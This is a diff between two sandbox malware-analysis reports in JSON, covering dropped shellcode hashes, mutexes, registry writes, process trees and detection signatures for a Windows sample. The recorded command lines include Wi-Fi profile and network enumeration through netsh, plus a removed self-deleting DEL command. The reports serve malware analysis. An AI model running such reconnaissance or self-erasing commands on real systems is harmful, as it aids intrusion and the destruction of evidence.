+        "user-agent": "",
+        "version": "1.1",
+        "method": "PUT",
+        "first_seen": 1787947824.135787
+      }
+    ],
+    "tcp_count": 71,
+    "udp_count": 56
   },
   "dropped_files": [
     {
-      "name": "report.lock",
-      "sha256": "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b",
-      "md5": "c4ca4238a0b923820dcc509a6f75849b",
-      "sha1": "356a192b7913b04c54574d18c28d46e6395428ab",
-      "size": 1,
-      "type": "very short file (no magic)",
-      "cape_type": "",
-      "roles": [
-        "dropped"
-      ]
-    },
-    {
-      "name": "13927b77dc514837e5f4e3f4cbcd4a19466bf9e75d8a11358b1fa6ec71aab382",
-      "sha256": "13927b77dc514837e5f4e3f4cbcd4a19466bf9e75d8a11358b1fa6ec71aab382",
-      "md5": "3890320f641e91e763b0f962538439ad",
-      "sha1": "7ee2117082636b1e17dab4f3fd5865195440f54f",
-      "size": 102,
+      "name": "acaef1b6633d71eeb23b1a24d1fe02d2e5cf2cbb54428fa61ad2b23ce5f6634b",
+      "sha256": "acaef1b6633d71eeb23b1a24d1fe02d2e5cf2cbb54428fa61ad2b23ce5f6634b",
+      "md5": "c3fe6ea383b5030b1a1815566e522422",
+      "sha1": "812d5eca95a174ec8e3f7ca9a55569870c0a5782",
+      "size": 29725,
       "type": "data",
       "cape_type": "Unpacked Shellcode",
       "roles": [
@@ -1626,11 +821,11 @@
       ]
     },
     {
-      "name": "fde560b18e281fe765b8bc729160c4da71a3f3c9dc1dca7143f0414b8af524e9",
-      "sha256": "fde560b18e281fe765b8bc729160c4da71a3f3c9dc1dca7143f0414b8af524e9",
-      "md5": "d5c9ab0f44f0ef2aa04d43505b0fae62",
-      "sha1": "9ad1083ef1018b178873d6650bb050f3e0af49c0",
-      "size": 534,
+      "name": "51fb8cdaa208b0cf4a05c2a36e97f53ff3740dbb3ca5bf4c827201d324973057",
+      "sha256": "51fb8cdaa208b0cf4a05c2a36e97f53ff3740dbb3ca5bf4c827201d324973057",
+      "md5": "8dc5a025aeea197b847e2aa7aa12296c",
+      "sha1": "4e6c198a292104fc163b50516e57bef16b28fcc4",
+      "size": 102,
       "type": "data",
       "cape_type": "Unpacked Shellcode",
       "roles": [
@@ -1640,82 +835,76 @@
   ],
   "host_activity": {
     "mutexes": [
-      "m01g4892qu",
-      "Local\\SM0:676:304:WilStaging_02",
-      "Local\\SM0:5560:304:WilStaging_02"
+      "m01g4892qu"
     ],
     "created_services": [],
-    "started_services": [],
+    "started_services": [
+      "edgeupdate"
+    ],
     "commands_executed": [
       "\"cmd.exe\" /c chcp 65001 && netsh wlan show profiles|findstr /R /C:\"[ ]:[ ]\"",
       "\"cmd.exe\" /c chcp 65001 && netsh wlan show networks mode=bssid | findstr \"SSID BSSID Signal\"",
-      "\"C:\\Windows\\System32\\cmd.exe\" /C chcp 65001 && timeout /t 3 > NUL && DEL /F /S /Q /A \"C:\\Users\\Windows\\AppData\\Local\\Temp\\sample.exe\"",
       "chcp  65001",
       "netsh  wlan show profiles",
       "findstr  /R /C:\"[ ]:[ ]\"",
-      "C:\\Windows\\system32\\DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B}",
       "netsh  wlan show networks mode=bssid",
-      "findstr  \"SSID BSSID Signal\"",
-      "timeout  /t 3"
+      "findstr  \"SSID BSSID Signal\""
     ],
     "registry_keys_written": {
       "items": [
-        "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Tracing\\sample_RASAPI32",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\sample_RASAPI32\\EnableFileTracing",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\sample_RASAPI32\\EnableAutoFileTracing",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\sample_RASAPI32\\EnableConsoleTracing",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\sample_RASAPI32\\FileTracingMask",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\sample_RASAPI32\\ConsoleTracingMask",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\sample_RASAPI32\\MaxFileSize",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\sample_RASAPI32\\FileDirectory",
-        "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Tracing\\sample_RASMANCS",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\sample_RASMANCS\\EnableFileTracing",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\sample_RASMANCS\\EnableAutoFileTracing",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\sample_RASMANCS\\EnableConsoleTracing",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\sample_RASMANCS\\FileTracingMask",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\sample_RASMANCS\\ConsoleTracingMask",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\sample_RASMANCS\\MaxFileSize",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\sample_RASMANCS\\FileDirectory",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\IPSEC\\Policy\\Local",
-        "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\PeerDist",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\PeerDist\\Service\\HTTPExtension",
-        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\PeerDist\\CacheMgr\\CacheRescalingFactor"
+        "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Tracing\\03423b8784cac66602f6_RASAPI32",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\03423b8784cac66602f6_RASAPI32\\EnableFileTracing",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\03423b8784cac66602f6_RASAPI32\\EnableAutoFileTracing",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\03423b8784cac66602f6_RASAPI32\\EnableConsoleTracing",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\03423b8784cac66602f6_RASAPI32\\FileTracingMask",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\03423b8784cac66602f6_RASAPI32\\ConsoleTracingMask",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\03423b8784cac66602f6_RASAPI32\\MaxFileSize",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\03423b8784cac66602f6_RASAPI32\\FileDirectory",
+        "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Tracing\\03423b8784cac66602f6_RASMANCS",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\03423b8784cac66602f6_RASMANCS\\EnableFileTracing",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\03423b8784cac66602f6_RASMANCS\\EnableAutoFileTracing",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\03423b8784cac66602f6_RASMANCS\\EnableConsoleTracing",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\03423b8784cac66602f6_RASMANCS\\FileTracingMask",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\03423b8784cac66602f6_RASMANCS\\ConsoleTracingMask",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\03423b8784cac66602f6_RASMANCS\\MaxFileSize",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\03423b8784cac66602f6_RASMANCS\\FileDirectory",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\IPSEC\\Policy\\Local"
       ],
-      "total_count": 20,
+      "total_count": 17,
       "truncated": false
     }
   },
   "process_tree": [
     {
-      "name": "sample.exe",
-      "pid": 676,
-      "parent_id": 4484,
-      "module_path": "C:\\Users\\Windows\\AppData\\Local\\Temp\\sample.exe",
+      "name": "03423b8784cac66602f6.exe",
+      "pid": 1776,
+      "parent_id": 3888,
+      "module_path": "C:\\Users\\sandbox\\AppData\\Local\\Temp\\03423b8784cac66602f6.exe",
       "children": [
         {
           "name": "cmd.exe",
-          "pid": 5632,
-          "parent_id": 676,
+          "pid": 5516,
+          "parent_id": 1776,
           "module_path": "C:\\Windows\\System32\\cmd.exe",
           "children": [
             {
               "name": "chcp.com",
-              "pid": 4200,
-              "parent_id": 5632,
+              "pid": 4824,
+              "parent_id": 5516,
               "module_path": "C:\\Windows\\System32\\chcp.com",
               "children": []
             },
             {
               "name": "netsh.exe",
-              "pid": 7268,
-              "parent_id": 5632,
+              "pid": 2740,
+              "parent_id": 5516,
               "module_path": "C:\\Windows\\System32\\netsh.exe",
               "children": []
             },
             {
               "name": "findstr.exe",
-              "pid": 7356,
-              "parent_id": 5632,
+              "pid": 5072,
+              "parent_id": 5516,
               "module_path": "C:\\Windows\\System32\\findstr.exe",
               "children": []
             }
@@ -1723,51 +912,29 @@
         },
         {
           "name": "cmd.exe",
-          "pid": 8040,
-          "parent_id": 676,
+          "pid": 2212,
+          "parent_id": 1776,
           "module_path": "C:\\Windows\\System32\\cmd.exe",
           "children": [
             {
               "name": "chcp.com",
-              "pid": 7492,
-              "parent_id": 8040,
+              "pid": 2972,
+              "parent_id": 2212,
               "module_path": "C:\\Windows\\System32\\chcp.com",
               "children": []
             },
             {
               "name": "netsh.exe",
-              "pid": 8140,
-              "parent_id": 8040,
+              "pid": 3716,
+              "parent_id": 2212,
               "module_path": "C:\\Windows\\System32\\netsh.exe",
               "children": []
             },
             {
               "name": "findstr.exe",
-              "pid": 5440,
-              "parent_id": 8040,
+              "pid": 204,
+              "parent_id": 2212,
               "module_path": "C:\\Windows\\System32\\findstr.exe",
-              "children": []
-            }
-          ]
-        },
-        {
-          "name": "cmd.exe",
-          "pid": 4276,
-          "parent_id": 676,
-          "module_path": "C:\\Windows\\System32\\cmd.exe",
-          "children": [
-            {
-              "name": "chcp.com",
-              "pid": 884,
-              "parent_id": 4276,
-              "module_path": "C:\\Windows\\System32\\chcp.com",
-              "children": []
-            },
-            {
-              "name": "timeout.exe",
-              "pid": 4252,
-              "parent_id": 4276,
-              "module_path": "C:\\Windows\\System32\\timeout.exe",
               "children": []
             }
           ]
@@ -1776,23 +943,15 @@
     },
     {
       "name": "svchost.exe",
-      "pid": 772,
-      "parent_id": 640,
+      "pid": 708,
+      "parent_id": 580,
       "module_path": "C:\\Windows\\System32\\svchost.exe",
-      "children": [
-        {
-          "name": "dllhost.exe",
-          "pid": 5560,
-          "parent_id": 772,
-          "module_path": "C:\\Windows\\System32\\dllhost.exe",
-          "children": []
-        }
-      ]
+      "children": []
     },
     {
       "name": "svchost.exe",
-      "pid": 384,
-      "parent_id": 640,
+      "pid": 5064,
+      "parent_id": 580,
       "module_path": "C:\\Windows\\System32\\svchost.exe",
       "children": []
     }
@@ -1806,15 +965,6 @@
         "evasion",
         "execution",
         "injection"
-      ]
-    },
-    {
-      "name": "creates_suspended_process",
-      "description": "Creates a process in a suspended state, likely for injection",
-      "severity": 2,
-      "categories": [
-        "injection",
-        "process hollowing"
       ]
     },
     {
@@ -1851,73 +1001,6 @@
       "categories": [
         "evasion",
         "stealth",
-        "fileless",
-        "shellcode"
-      ]
-    },
-    {
-      "name": "unbacked_crypto_operations",
-      "description": "Invoked native Windows cryptographic APIs from dynamically allocated (unbacked) memory, possible encryption/decryption of payloads, c2, files or data",
-      "severity": 3,
-      "categories": [
-        "evasion",
-        "c2",
-        "fileless",
-        "obfuscation",
-        "shellcode"
-      ]
-    },
-    {
-      "name": "unbacked_file_dropping",
-      "description": "Writes data to the filesystem from dynamically allocated (unbacked) memory",
-      "severity": 3,
-      "categories": [
-        "execution",
-        "exfiltration",
-        "fileless",
-        "shellcode"
-      ]
-    },
-    {
-      "name": "unbacked_process_enumeration",
-      "description": "Attempted to enumerate running processes from dynamically allocated (unbacked) memory",
-      "severity": 3,
-      "categories": [
-        "discovery",
-        "fileless",
-        "reconnaissance",
-        "shellcode"
-      ]
-    },
-    {
-      "name": "unbacked_service_manipulation",
-      "description": "Attempted to interact with the Service Control Manager from dynamically allocated (unbacked) memory",
-      "severity": 3,
-      "categories": [
-        "lateral_movement",
-        "persistence",
-        "fileless",
-        "shellcode"
-      ]
-    },
-    {
-      "name": "unbacked_dns_resolution",
-      "description": "Attempted to resolve a domain name from dynamically allocated (unbacked) memory",
-      "severity": 3,
-      "categories": [
-        "network",
-        "c2",
-        "fileless",
-        "shellcode"
-      ]
-    },
-    {
-      "name": "unbacked_memory_network_connection",
-      "description": "Network connection initiated from dynamically allocated (unbacked) memory, indicative of fileless C2 activity",
-      "severity": 3,
-      "categories": [
-        "network",
-        "c2",
         "fileless",
         "shellcode"
       ]
